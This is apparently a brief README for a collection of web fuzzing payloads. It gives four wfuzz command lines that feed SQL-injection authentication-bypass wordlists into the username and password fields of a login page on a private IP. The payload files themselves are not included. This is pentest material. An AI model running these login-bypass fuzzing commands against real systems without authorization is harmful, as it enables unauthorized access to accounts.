# web-fuzzing-payloads
Use this payloads to web fuzzing test  

Usage

wfuzz -c --hh=10 -u http://172.16.76.158:8080/login.php -w auth_bypass_sqli.txt -d "username=FUZZ&password=sa1"
wfuzz -c --hh=10 -u http://172.16.76.158:8080/login.php -w auth_bypass_sqli.txt -d "username=sayaa&password=FUZZ"
wfuzz -c --hh=10 -u http://172.16.76.158:8080/login.php -z file,auth_bypass_sqli.txt -z file,auth_bypass_sqli.txt -d "username=FUZZ&password=FUZ2Z"

wfuzz -c --hh=10 -u http://172.16.76.158:8080/login.php -w auth_bypass_with_hash_check_sqli.txt -d "username=FUZZ&password=password123"
